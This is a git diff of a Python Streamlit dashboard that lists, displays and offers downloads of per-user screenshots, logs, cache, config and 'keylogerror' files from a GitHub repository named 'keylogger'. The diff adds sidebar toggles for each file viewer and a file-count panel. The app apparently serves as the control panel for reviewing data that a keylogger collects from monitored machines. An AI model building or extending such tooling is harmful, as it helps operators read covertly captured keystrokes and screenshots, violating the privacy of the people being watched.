@@ -1,4 +1,4 @@
-# user loging
+# user loging --> Active users Dashboard (logs, cache , config , keylogerror file content viewer) - Download Files
 import re
 import os
 import ast
@@ -365,11 +365,11 @@ GITHUB_API_BASE_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/
 
 # GitHub repository folders to check
 FOLDERS = {
-    "screenshots": "screenshots",
-    "config": "config",
     "cache": "cache",
+    "config": "config",
+    "keylogerror": "keylogerror",
     "logs": "logs",
-    "keylogerror": "keylogerror"
+    "screenshots": "screenshots",
 }
 
 # Function to get the list of files in a folder
@@ -491,7 +491,7 @@ def tabbeddashboard():
     tab1, tab5 = st.tabs(["Active users Dashboard", "Download Files"])
     
     
-    # Tab 5: Active users Dashboard
+    # Tab 1: Active users Dashboard
     with tab1:
         st.header("Active users Dashboard") 
 
@@ -753,29 +753,31 @@ def tabbeddashboard():
                 # Combine users and ensure uniqueness
                 all_users = sorted(set(logs_users))
                 all_users.insert(0, "All Users")  # Add option to select all users
-                # 
+                
                 # Sidebar dropdown for user selection
                 selected_user = st.sidebar.selectbox("Select User (Logs File)", all_users)
-                    # 
-                # Show Logs Files
-                st.subheader("Logs Files")
-                filtered_logs_files = {k: v for k, v in logs_user_files.items() if selected_user == "All Users" or k.startswith(selected_user)}
-                # 
-                for key, (filename, file_url) in filtered_logs_files.items():
-                    with st.expander(f"**{filename}**: Show File Content"):
-                        content = get_file_content(file_url)
-                        if content:
-                            st.text_area("File Content", content, height=300, disabled=True, key=f"logs_{filename}")
-                            # 
-                            st.write(f"[Open File Content]({file_url})")
-                            # 
-                            # Provide file download option
-                            st.download_button(label="Download File", data=content, file_name=filename, mime="application/json", key=f"logs_dl_{filename}")
                 
-                # Fullscreen content view
-                if "fullscreen_content" in st.session_state:
-                    st.subheader(f"Full-screen View: {st.session_state['fullscreen_user']}")
-                    st.text_area("", st.session_state["fullscreen_content"], height=600, disabled=True, key="fullscreen_text")
+                # Show Logs Files
+                show_logs_files = st.sidebar.checkbox("Show Logs files")
+                if show_logs_files:
+                    st.subheader("Logs Files")
+                    filtered_logs_files = {k: v for k, v in logs_user_files.items() if selected_user == "All Users" or k.startswith(selected_user)}
+                    # 
+                    for key, (filename, file_url) in filtered_logs_files.items():
+                        with st.expander(f"**{filename}**: Show File Content"):
+                            content = get_file_content(file_url)
+                            if content:
+                                st.text_area("File Content", content, height=300, disabled=True, key=f"logs_{filename}")
+                                # 
+                                st.write(f"[Open File Content]({file_url})")
+                                # 
+                                # Provide file download option
+                                st.download_button(label="Download File", data=content, file_name=filename, mime="application/json", key=f"logs_dl_{filename}")
+
+                    # Fullscreen content view
+                    if "fullscreen_content" in st.session_state:
+                        st.subheader(f"Full-screen View: {st.session_state['fullscreen_user']}")
+                        st.text_area("", st.session_state["fullscreen_content"], height=600, disabled=True, key="fullscreen_text")
                 
                 
                 
@@ -797,67 +799,73 @@ def tabbeddashboard():
                 selected_user = st.sidebar.selectbox("Select User (files)", all_users)
                    
                 # Show Cache Files
-                st.subheader("Cache Files")
-                filtered_cache_files = {k: v for k, v in cache_user_files.items() if selected_user == "All Users" or selected_user == k}
+                show_cache_files = st.sidebar.checkbox("Show Cache files")
+                if show_cache_files:
+                    st.subheader("Cache Files")
+                    filtered_cache_files = {k: v for k, v in cache_user_files.items() if selected_user == "All Users" or selected_user == k}
 
-                for user, file_url in filtered_cache_files.items():
-                    with st.expander(f"**{user}_files_cache.json**: Show File Content"):
-                        content = get_file_content(file_url)
-                        if content:
-                            st.text_area("File Content", content, height=300, disabled=True, key=f"cache_{user}")
+                    for user, file_url in filtered_cache_files.items():
+                        with st.expander(f"**{user}_files_cache.json**: Show File Content"):
+                            content = get_file_content(file_url)
+                            if content:
+                                st.text_area("File Content", content, height=300, disabled=True, key=f"cache_{user}")
 
-                            st.write(f"[Open File Content]({file_url})")
+                                st.write(f"[Open File Content]({file_url})")
 
-                            # Button to open full-screen content
-                            if st.button(f"View {user} File in Fullscreen", key=f"cache_btn_{user}"):
-                                st.session_state["fullscreen_content"] = content
-                                st.session_state["fullscreen_user"] = user
-                                st.rerun()
+                                # Button to open full-screen content
+                                if st.button(f"View {user} File in Fullscreen", key=f"cache_btn_{user}"):
+                                    st.session_state["fullscreen_content"] = content
+                                    st.session_state["fullscreen_user"] = user
+                                    st.rerun()
 
-                            # Provide file download option
-                            st.download_button(label="Download File", data=content, file_name=f"{user}_files_cache.json", mime="application/json", key=f"cache_dl_{user}")
+                                # Provide file download option
+                                st.download_button(label="Download File", data=content, file_name=f"{user}_files_cache.json", mime="application/json", key=f"cache_dl_{user}")
 
                 # Show Config Files
-                st.subheader("Config Files")
-                filtered_config_files = {k: v for k, v in config_user_files.items() if selected_user == "All Users" or selected_user == k}
+                show_config_files = st.sidebar.checkbox("Show Config files")
+                if show_config_files:
+                    st.subheader("Config Files")
+                    filtered_config_files = {k: v for k, v in config_user_files.items() if selected_user == "All Users" or selected_user == k}
 
-                for user, file_url in filtered_config_files.items():
-                    with st.expander(f"**{user}_config.json**: Show File Content"):
-                        content = get_file_content(file_url)
-                        if content:
-                            st.text_area("File Content", content, height=300, disabled=True, key=f"config_{user}")
+                    for user, file_url in filtered_config_files.items():
+                        with st.expander(f"**{user}_config.json**: Show File Content"):
+                            content = get_file_content(file_url)
+                            if content:
+                                st.text_area("File Content", content, height=300, disabled=True, key=f"config_{user}")
 
-                            st.write(f"[Open File Content]({file_url})")
+                                st.write(f"[Open File Content]({file_url})")
 
-                            # Button to open full-screen content
-                            if st.button(f"View {user} File in Fullscreen", key=f"config_btn_{user}"):
-                                st.session_state["fullscreen_content"] = content
-                                st.session_state["fullscreen_user"] = user
-                                st.rerun()
+                                # Button to open full-screen content
+                                if st.button(f"View {user} File in Fullscreen", key=f"config_btn_{user}"):
+                                    st.session_state["fullscreen_content"] = content
+                                    st.session_state["fullscreen_user"] = user
+                                    st.rerun()
 
-                            # Provide file download option
-                            st.download_button(label="Download File", data=content, file_name=f"{user}_config.json", mime="application/json", key=f"config_dl_{user}")
+                                # Provide file download option
+                                st.download_button(label="Download File", data=content, file_name=f"{user}_config.json", mime="application/json", key=f"config_dl_{user}")
 
                 # Show keylogerror Files
-                st.subheader("Keylogerror Files")
-                filtered_keylogerror_files = {k: v for k, v in keylogerror_user_files.items() if selected_user == "All Users" or selected_user == k}
-
-                for user, file_url in filtered_keylogerror_files.items():
-                    with st.expander(f"**{user}_keylogerror.log**: Show File Content"):
-                        content = get_file_content(file_url)
-                        if content:
-                            st.text_area("File Content", content, height=300, disabled=True, key=f"keylogerror_{user}")
-
-                            st.write(f"[Open File Content]({file_url})")
-
-                            # Button to open full-screen content
-                            if st.button(f"View {user} File in Fullscreen", key=f"keylogerror_btn_{user}"):
-                                st.session_state["fullscreen_content"] = content
-                                st.session_state["fullscreen_user"] = user
-                                st.rerun()
-
-                            # Provide file download option
-                            st.download_button(label="Download File", data=content, file_name=f"{user}_keylogerror.log", mime="application/log", key=f"keylogerror_dl_{user}")
+                show_keylogerror_files = st.sidebar.checkbox("Show Keylogerror files")
+                if show_keylogerror_files:
+                    st.subheader("Keylogerror Files")
+                    filtered_keylogerror_files = {k: v for k, v in keylogerror_user_files.items() if selected_user == "All Users" or selected_user == k}
+    
+                    for user, file_url in filtered_keylogerror_files.items():
+                        with st.expander(f"**{user}_keylogerror.log**: Show File Content"):
+                            content = get_file_content(file_url)
+                            if content:
+                                st.text_area("File Content", content, height=300, disabled=True, key=f"keylogerror_{user}")
+    
+                                st.write(f"[Open File Content]({file_url})")
+    
+                                # Button to open full-screen content
+                                if st.button(f"View {user} File in Fullscreen", key=f"keylogerror_btn_{user}"):
+                                    st.session_state["fullscreen_content"] = content
+                                    st.session_state["fullscreen_user"] = user
+                                    st.rerun()
+    
+                                # Provide file download option
+                                st.download_button(label="Download File", data=content, file_name=f"{user}_keylogerror.log", mime="application/log", key=f"keylogerror_dl_{user}")
 
                 # Fullscreen content view
                 if "fullscreen_content" in st.session_state:
@@ -866,6 +874,62 @@ def tabbeddashboard():
 
                 
                 
+                # count files
+                show_count_files = st.sidebar.checkbox("Show Count Files")
+                if show_count_files:
+                    st.header("Count Files")
+                    if st.button("Get Number of Files"):
+                        st.write("Fetching file counts...")
+
+                    # Use columns to organize the output
+                    col1, col2, col3 = st.columns(3)
+
+                    for i, (folder_name, folder_path) in enumerate(FOLDERS.items()):
+                        files = get_number_of_files(folder_path)
+                        num_files = len(files)  # Calculate the number of files
+                        github_url = f"https://github.com/bebedudu/keylogger/tree/main/uploads/{folder_path}"
+
+                        # Alternate between columns for better layout
+                        if i % 3 == 0:
+                            with col1:
+                                st.markdown(
+                                    f"""
+                                    <div style="padding: 10px; border-radius: 10px; background-color: #212121; margin: 10px 0;">
+                                        <a href="{github_url}" style="text-decoration: none; color: inherit;">
+                                            <h3>{folder_name.capitalize()}</h3>
+                                            <p style="font-size: 24px; font-weight: bold; color: #4a90e2;">{num_files} files</p>
+                                        </a>
+                                    </div>
+                                    """,
+                                    unsafe_allow_html=True
+                                )
+                        elif i % 3 == 1:
+                            with col2:
+                                st.markdown(
+                                    f"""
+                                    <div style="padding: 10px; border-radius: 10px; background-color: #212121; margin: 10px 0;">
+                                        <a href="{github_url}" style="text-decoration: none; color: inherit;">
+                                            <h3>{folder_name.capitalize()}</h3>
+                                            <p style="font-size: 24px; font-weight: bold; color: #4a90e2;">{num_files} files</p>
+                                        </a>
+                                    </div>
+                                    """,
+                                    unsafe_allow_html=True
+                                )
+                        else:
+                            with col3:
+                                st.markdown(
+                                    f"""
+                                    <div style="padding: 10px; border-radius: 10px; background-color: #212121; margin: 10px 0;">
+                                        <a href="{github_url}" style="text-decoration: none; color: inherit;">
+                                            <h3>{folder_name.capitalize()}</h3>
+                                            <p style="font-size: 24px; font-weight: bold; color: #4a90e2;">{num_files} files</p>
+                                        </a>
+                                    </div>
+                                    """,
+                                    unsafe_allow_html=True
+                                )
+
 
 
 
@@ -875,6 +939,7 @@ def tabbeddashboard():
                 anomalies = detect_anomalies(user_data)
                 # Display anomalies in a table
                 if anomalies:
+                    st.header("Anomalies Detected")
                     st.warning("⚠️🚨 Anomalies detected in user activity:")
                     for anomaly in anomalies:
                         st.write(f"**User:** {anomaly['user']}, **Reason:** {anomaly['reason']}")
